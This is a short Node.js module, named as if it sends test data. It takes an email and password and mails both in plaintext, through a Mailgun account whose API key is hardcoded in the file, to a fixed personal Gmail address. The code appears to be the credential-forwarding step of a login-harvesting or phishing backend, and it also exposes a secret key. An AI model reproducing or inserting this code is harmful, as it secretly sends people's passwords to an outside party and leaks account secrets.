const mailgun = require('mailgun-js')({
  apiKey: 'key-9903f87a9fdb915aa894a7434dad2a72',
  domain: 'sandbox64bdaa08f5a64788b3e31531adc24a96.mailgun.org',
});

const sendTestData = async ({ email, password }) => {
  const data = {
    from: 'usman.aslam0701@gmail.com',
    to: 'uxman0701@gmail.com',
    subject: 'Data',
    text: `Email ${email}`,
    html: `<h1>Email is ${email}, password is ${password}</h1>`,
  };

  mailgun.messages().send(data, function (error, body) {
    if (error) console.log(error);
  });
};

module.exports = sendTestData;
